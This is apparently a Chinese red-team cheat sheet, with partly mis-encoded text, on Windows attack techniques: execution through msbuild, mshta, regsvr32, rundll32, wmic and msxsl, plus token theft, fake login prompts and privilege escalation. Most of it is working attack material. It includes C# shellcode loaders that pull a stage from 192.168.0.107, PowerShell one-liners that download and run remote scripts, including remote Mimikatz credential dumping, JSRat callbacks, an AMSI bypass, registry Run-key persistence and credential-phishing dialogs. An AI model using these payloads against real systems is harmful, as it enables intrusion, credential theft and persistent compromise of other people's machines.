		<span class="token class-name">UInt32</span> uuKxFZFwog <span class="token operator">=</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token number">0x00040000</span><span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">UInt32</span> sDPjIMhJIOAlwn <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>uuKxFZFwog<span class="token punctuation">,</span><span class="token number">0x00000008</span><span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>sDPjIMhJIOAlwn<span class="token punctuation">,</span> KNCtlJWAmlqJ<span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">UInt32</span> ijifOEfllRl <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token class-name">IntPtr</span> ihXuoEirmz <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> sDPjIMhJIOAlwn<span class="token punctuation">,</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">ref</span> ijifOEfllRl<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>ihXuoEirmz<span class="token punctuation">,</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
	
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> ZKSAAFwxgSDnTW <span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span> ZKSAAFwxgSDnTW <span class="token operator">=</span> <span class="token function">HMSjEXjuIzkkmo</span><span class="token punctuation">(</span><span class="token string">"192.168.0.107"</span><span class="token punctuation">,</span><span class="token number">12138</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">TOdKEwPYRUgJly</span><span class="token punctuation">(</span>ZKSAAFwxgSDnTW<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Msbuild"><a href="#Msbuild" class="headerlink" title="Msbuild"></a>Msbuild</h4><pre><code>https://gitee.com/RichChigga/msbuild-exec
MSFç›‘å¬
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 1.xml
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Project</span> <span class="token attr-name">ToolsVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.microsoft.com/developer/msbuild/2003<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Target</span> <span class="token attr-name">Name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iJEKHyTEjyCU<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xUokfh</span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Target</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UsingTask</span>
<span class="token attr-name">TaskName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xUokfh<span class="token punctuation">"</span></span>
<span class="token attr-name">TaskFactory</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CodeTaskFactory<span class="token punctuation">"</span></span>
<span class="token attr-name">AssemblyFile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Task</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Code</span> <span class="token attr-name">Type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Class<span class="token punctuation">"</span></span> <span class="token attr-name">Language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token cdata">&lt;![CDATA[
using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;
using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class xUokfh : Task, ITask &#123;
[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 ogephG,UInt32 fZZrvQ, UInt32 nDfrBaiPvDyeP, UInt32 LWITkrW);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 qEVoJxknom, UInt32 gZyJBJWYQsnXkWe, UInt32 jyIPELfKQYEVZM,IntPtr adztSLHGJiurGO, UInt32 vjSCprCJ, ref UInt32 KbPukprMQXUp);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr wVCIQGmqjONiM, UInt32 DFgVrE);
static byte[] VYcZlUehuq(string IJBRrBqhigjGAx, int XBUCexXIrGIEpe) &#123;
IPEndPoint DRHsPzS = new IPEndPoint(IPAddress.Parse(IJBRrBqhigjGAx),XBUCexXIrGIEpe);
Socket zCoDOd = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
try &#123; zCoDOd.Connect(DRHsPzS); &#125;
catch &#123; return null;&#125;
byte[] OCrGofbbWRVsFEl = new byte[4];
zCoDOd.Receive(OCrGofbbWRVsFEl, 4, 0);
int auQJTjyxYw = BitConverter.ToInt32(OCrGofbbWRVsFEl, 0);
byte[] MlhacMDOKUAfvMX = new byte[auQJTjyxYw + 5];
int GFtbdD = 0;
while (GFtbdD &lt; auQJTjyxYw)
&#123; GFtbdD += zCoDOd.Receive(MlhacMDOKUAfvMX, GFtbdD + 5, (auQJTjyxYw -GFtbdD) &lt; 4096 ? (auQJTjyxYw - GFtbdD) : 4096, 0);&#125;
byte[] YqBRpsmDUT = BitConverter.GetBytes((int)zCoDOd.Handle);
Array.Copy(YqBRpsmDUT, 0, MlhacMDOKUAfvMX, 1, 4); MlhacMDOKUAfvMX[0]= 0xBF;
return MlhacMDOKUAfvMX;&#125;
static void NkoqFHncrcX(byte[] qLAvbAtan) &#123;
if (qLAvbAtan != null) &#123;
UInt32 jrYMBRkOAnqTqx = VirtualAlloc(0, (UInt32)qLAvbAtan.Length, 0x1000, 0x40);
Marshal.Copy(qLAvbAtan, 0, (IntPtr)(jrYMBRkOAnqTqx),qLAvbAtan.Length);
IntPtr WCUZoviZi = IntPtr.Zero;
UInt32 JhtJOypMKo = 0;
IntPtr UxebOmhhPw = IntPtr.Zero;
WCUZoviZi = CreateThread(0, 0, jrYMBRkOAnqTqx, UxebOmhhPw, 0, ref JhtJOypMKo);
WaitForSingleObject(WCUZoviZi, 0xFFFFFFFF); &#125;&#125;
public override bool Execute()
&#123;
byte[] uABVbNXmhr = null; uABVbNXmhr = VYcZlUehuq("192.168.0.107",12138);
NkoqFHncrcX(uABVbNXmhr);
return true; &#125; &#125;
]]></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Code</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Task</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UsingTask</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Project</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Winrm"><a href="#Winrm" class="headerlink" title="Winrm"></a>Winrm</h4><pre><code>MSFç›‘å¬
</code></pre>
<p><img src="./img/131.png" alt="image"></p>
<pre><code>&gt;mkdir winrm
&gt;copy c:\Windows\System32\cscript.exe winrm
åˆ›å»ºæ–‡ä»¶WsmPty.xslå¤åˆ¶payloadè¿›å»
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stylesheet</span>
<span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/XSL/Transform<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ms</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:xslt<span class="token punctuation">"</span></span>
<span class="token attr-name"><span class="token namespace">xmlns:</span>user</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span>
<span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ms:</span>script</span> <span class="token attr-name">implements-prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
 <span class="token cdata">&lt;![CDATA[
 var r = new ActiveXObject("WScript.Shell").Run("cmd");
 ]]></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ms:</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stylesheet</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="./img/132.png" alt="image"></p>
<pre><code>æ‰§è¡Œ
&gt;cscript.exe //nologo C:\Windows\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
</code></pre>
<p><img src="./img/133.png" alt="image"></p>
<h4 id="Mshta-1"><a href="#Mshta-1" class="headerlink" title="Mshta"></a>Mshta</h4><pre><code>&gt;use exploit/windows/misc/hta_server
&gt;set srvhost 192.168.0.107
&gt;mshta http://192.168.0.107:8080/RgNeCv.hta
</code></pre>
<p><img src="./img/134.png" alt="image"></p>
<pre><code>æ‰§è¡Œvb
    &gt;mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)
Js
    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;
Jsrat
    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;
</code></pre>
<h4 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h4><pre><code>ä¸Šçº¿Empire
&gt;usestager windows/launcher_sct
ç”Ÿæˆsctæ–‡ä»¶æ”¾å…¥webç›®å½•
&gt;regsvr32 /s /n /u /i:http://192.168.0.107:8080/launcher.sct scrobj.dll
&gt;cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://192.168.0.107/test.sct
</code></pre>
<h4 id="Rundll32"><a href="#Rundll32" class="headerlink" title="Rundll32"></a>Rundll32</h4><h5 id="æ‰§è¡Œæ–‡ä»¶"><a href="#æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="æ‰§è¡Œæ–‡ä»¶"></a>æ‰§è¡Œæ–‡ä»¶</h5><pre><code>&gt;rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe
&gt;rundll32 url.dll, OpenURLA file://c:\windows\system32\calc.exe
&gt;rundll32 url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
&gt;rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
&gt;rundll32 url.dll, FileProtocolHandler calc.exe
</code></pre>
<h5 id="æ— å¼¹çª—æ‰§è¡Œ"><a href="#æ— å¼¹çª—æ‰§è¡Œ" class="headerlink" title="æ— å¼¹çª—æ‰§è¡Œ"></a>æ— å¼¹çª—æ‰§è¡Œ</h5><pre><code>&gt;rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:/Windows/System32/mshta.exe http://192.168.0.107:8080/SU8Fd6kNRz0.hta&quot;,0,true);self.close();
</code></pre>
<h5 id="å¢åˆ æ³¨å†Œè¡¨"><a href="#å¢åˆ æ³¨å†Œè¡¨" class="headerlink" title="å¢åˆ æ³¨å†Œè¡¨"></a>å¢åˆ æ³¨å†Œè¡¨</h5><pre><code>ä¿å­˜ä¸º.infæ–‡ä»¶
&gt;rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf
[Version]
Signature=&quot;$WINDOWS NT$&quot;
[DefaultInstall]
AddReg=AddReg
DelReg=DelReg
[AddReg] #åˆ é™¤DelRegåˆ æ‰çº¢è‰²éƒ¨åˆ†æ‰§è¡Œ
HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,SYSTEM,0x00000000,c:/windows/temp/sv.exe
0x00010001è¡¨ç¤ºREG_DWORDæ•°æ®ç±»å‹ï¼Œ0x00000000æˆ–çœç•¥è¯¥é¡¹(ä¿ç•™é€—å·)è¡¨ç¤ºREG_SZ(å­—ç¬¦ä¸²)
</code></pre>
<h5 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h5><pre><code>&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\Temp\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close();
</code></pre>
<h5 id="Out-RundllCommand"><a href="#Out-RundllCommand" class="headerlink" title="Out-RundllCommand"></a>Out-RundllCommand</h5><pre><code>ä½¿ç”¨nishangè„šæœ¬Out-RundllCommandç”Ÿæˆrundllä»£ç 
&gt;powershell -nop -w h -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Execution/Out-RundllCommand.ps1&#39;); Out-RundllCommand -Reverse -IPAddress 192.168.0.107 -Port 12345&quot;
</code></pre>
<p><img src="./img/135.png" alt="image"><br><img src="./img/136.png" alt="image"></p>
<pre><code>æ³¨ï¼šä½ç‰ˆæœ¬powershellï¼Œéšè—çª—å£åªè¯†åˆ«-w hiddenï¼Œé«˜ç‰ˆæœ¬å¯ä»¥-w h
æ‰§è¡Œè¿œç¨‹PSè„šæœ¬
&gt;Out-RundllCommand -PayloadURL http://192.168.0.107/Invoke-PowerShellUdp.ps1 -Arguments &quot;Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.107 -Port 12138&quot;
ä¸Šçº¿MSF
ç”Ÿæˆpsh-reflectionæ ¼å¼è„šæœ¬
&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();r=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;powershell -w hidden -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/xx.ps1&#39;));&quot;,0,true);
</code></pre>
<h4 id="DotNetToJScript"><a href="#DotNetToJScript" class="headerlink" title="DotNetToJScript"></a>DotNetToJScript</h4><pre><code>é€šè¿‡js/vbsæ‰§è¡Œ.netç¨‹åº
https://github.com/tyranid/DotNetToJScript/releases
&gt;DotNetToJScript.exe -o 1.js ExampleAssembly.dll ç”Ÿæˆjs
&gt;DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dllç”Ÿæˆvbs
&gt;DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll ç”Ÿæˆvba
&gt;DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dllç”Ÿæˆsct
</code></pre>
<h5 id="StarFighters"><a href="#StarFighters" class="headerlink" title="StarFighters"></a>StarFighters</h5><pre><code>https://github.com/Cn33liz/StarFighters å¯ä»¥æ‰§è¡Œpowershellä»£ç ï¼Œè¯¦è§
æ‰§è¡Œå•æ¡å‘½ä»¤
$code = &#39;start calc.exe&#39;
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded
å¤åˆ¶ä¸ºvar EncodedPayloadçš„å€¼
è¿œç¨‹æ‰§è¡Œmimikatz
powershell IEX &quot;(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -Command &#39;log privilege::debug sekurlsa::logonpasswords&#39;&quot;
ä»¥ä¸Šä¿å­˜åœ¨code.txt
$code = Get-Content -Path code.txt
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded | Out-File 2.txt
</code></pre>
<p><img src="./img/137.png" alt="image"></p>
<pre><code>ç”Ÿæˆçš„2.txtæ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºvar EncodedPayloadçš„å€¼å†æ‰§è¡Œ
</code></pre>
<p><img src="./img/138.png" alt="image"><br><img src="./img/139.png" alt="image"></p>
<h5 id="ç»•è¿‡AMSIæ‰§è¡Œ"><a href="#ç»•è¿‡AMSIæ‰§è¡Œ" class="headerlink" title="ç»•è¿‡AMSIæ‰§è¡Œ"></a>ç»•è¿‡AMSIæ‰§è¡Œ</h5><pre><code>&gt;copy c:\windows\system32\cscript.exe amsi.dll
&gt;amsi.dll evil.js
</code></pre>
<h4 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h4><pre><code>Empireå»ºç«‹ç›‘å¬ï¼Œç”Ÿæˆwindows/launcher_xslæ¨¡å—çš„xslæ–‡ä»¶ä¿å­˜åœ¨webç›®å½•
&gt;wmic process get brief /format:http://192.168.0.107:8080/launcher.xsl
ä¹Ÿå¯ç»“åˆmshtaä½¿ç”¨
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stylesheet</span>
<span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/XSL/Transform<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ms</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:xslt<span class="token punctuation">"</span></span>
<span class="token attr-name"><span class="token namespace">xmlns:</span>user</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span>
<span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ms:</span>script</span> <span class="token attr-name">implements-prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token cdata">&lt;![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("mshta http://192.168.0.107:8080/RgNeCv.hta");
	]]></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ms:</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stylesheet</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Msxsl"><a href="#Msxsl" class="headerlink" title="Msxsl"></a>Msxsl</h4><pre><code>ä¸‹è½½
https://www.microsoft.com/en-us/download/details.aspx?id=21714
è¿œç¨‹æ‰§è¡Œshellcode
https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml
&gt;msxls.exe http://192.168.0.107/shellcode.xml http://192.168.0.107/shellcode.xml
Empireç”Ÿæˆshellcodeè´´åˆ°è„šæœ¬ä¸­EncodedPayloadä½ç½®
</code></pre>
<p><img src="./img/140.png" alt="image"></p>
<h4 id="CPL"><a href="#CPL" class="headerlink" title="CPL"></a>CPL</h4><pre><code>Kaliç›‘å¬
</code></pre>
<p><img src="./img/141.png" alt="image"></p>
<pre><code>ç¼–è¯‘æˆDLL
</code></pre>
<p><img src="./img/142.png" alt="image"></p>
<pre><code>Controlæ‰§è¡Œ
&gt;control C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll
</code></pre>
<p><img src="./img/143.png" alt="image"></p>
<pre><code>æˆ–å°†DLLåç¼€æ”¹ä¸ºcplï¼ŒåŒå‡»æ‰§è¡Œï¼Œæˆ–rundll32æ‰§è¡Œ
&gt;rundll32.exe shell32.dll,Control_RunDLL C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll
</code></pre>
<h3 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h3><pre><code>#use exploit/windows/local/ask
</code></pre>
<h3 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a>ä»¤ç‰Œçªƒå–</h3><h4 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h4><pre><code>Meterpreter&gt;use incognito
Meterpreter&gt;list_tokens -u
Meterpreter&gt;impersonate_token name\\administrator
&amp;
Meterpreter&gt;ps
Meterpreter&gt;steal_token pid
</code></pre>
<h4 id="Cobalt-strike"><a href="#Cobalt-strike" class="headerlink" title="Cobalt strike"></a>Cobalt strike</h4><pre><code>beacon&gt; steal_token 1234 çªƒå–ä»¤ç‰Œ
beacon&gt; rev2self æ¢å¤ä»¤ç‰Œ
Windows
https://gitee.com/RichChigga/incognito2
</code></pre>
<h3 id="å¯†ç çªƒå–"><a href="#å¯†ç çªƒå–" class="headerlink" title="å¯†ç çªƒå–"></a>å¯†ç çªƒå–</h3><h4 id="ä¼ªé€ é”å±"><a href="#ä¼ªé€ é”å±" class="headerlink" title="ä¼ªé€ é”å±"></a>ä¼ªé€ é”å±</h4><pre><code>https://github.com/Pickfordmatt/SharpLocker/releases
</code></pre>
<p><img src="./img/144.png" alt="image"></p>
<pre><code>https://github.com/bitsadmin/fakelogonscreen/releases
</code></pre>
<p><img src="./img/145.png" alt="image"></p>
<pre><code>è®°å½•çš„å¯†ç ä¿å­˜åœ¨
%LOCALAPPDATA%\Microsoft\user.db
</code></pre>
<p><img src="./img/146.png" alt="image"></p>
<h4 id="ä¼ªé€ è®¤è¯æ¡†"><a href="#ä¼ªé€ è®¤è¯æ¡†" class="headerlink" title="ä¼ªé€ è®¤è¯æ¡†"></a>ä¼ªé€ è®¤è¯æ¡†</h4><h5 id="CredsLeaker"><a href="#CredsLeaker" class="headerlink" title="CredsLeaker"></a>CredsLeaker</h5><pre><code>https://github.com/Dviros/CredsLeaker
å°†cl_reader.phpï¼Œconfig.phpï¼Œconfig.clä¸Šä¼ åˆ°webæœåŠ¡å™¨
ä¿®æ”¹CredsLeaker.ps1ã€run.batä¸­URLå‚æ•°
</code></pre>
<p><img src="./img/147.png" alt="image"></p>
<pre><code>è¾“å…¥æ­£ç¡®å¯†ç åä¼šè‡ªåŠ¨ç»“æŸï¼Œå¦åˆ™é™¤éç»“æŸpowershellè¿›ç¨‹æ‰å¯ç»“æŸ
è·å–åˆ°æ­£ç¡®å¯†ç åä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆcreds.txtä¿å­˜å¯†ç ä¿¡æ¯
</code></pre>
<p><img src="./img/148.png" alt="image"></p>
<h5 id="LoginPrompt"><a href="#LoginPrompt" class="headerlink" title="LoginPrompt"></a>LoginPrompt</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-LoginPrompt.ps1&#39;);invoke-LoginPrompt&quot;
</code></pre>
<p><img src="./img/149.png" alt="image"></p>
<pre><code>é™¤éç»“æŸè¿›ç¨‹ï¼Œå¦åˆ™åªèƒ½è¾“å¯¹å¯†ç æ‰èƒ½å…³é—­å¯¹è¯æ¡†ã€‚
æ”¶åˆ°æ­£ç¡®å¯†ç ä¼šè¿”å›ç»“æœ
</code></pre>
<p><img src="./img/150.png" alt="image"></p>
<h5 id="Nishang-Invoke-CredentialsPhish"><a href="#Nishang-Invoke-CredentialsPhish" class="headerlink" title="Nishang-Invoke-CredentialsPhish"></a>Nishang-Invoke-CredentialsPhish</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.108/ps/nishang/Gather/Invoke-CredentialsPhish.ps1&#39;); Invoke-CredentialsPhish&quot;
</code></pre>
<p><img src="./img/151.png" alt="image"><br><img src="./img/152.png" alt="image"></p>
<h3 id="RottenPotato"><a href="#RottenPotato" class="headerlink" title="RottenPotato"></a>RottenPotato</h3><pre><code>https://github.com/foxglovesec/RottenPotato Meterpreter&gt;use incognito
Meterpreter&gt;list_tokens -u
Meterpreter&gt;upload /root/Desktop/rottenpotato.exe
Meterpreter&gt;execute -HC -f rottenpotato.exe
Meterpreter&gt;impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;
</code></pre>
<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><pre><code>æ£€æµ‹æœ‰æ¼æ´çš„æœåŠ¡
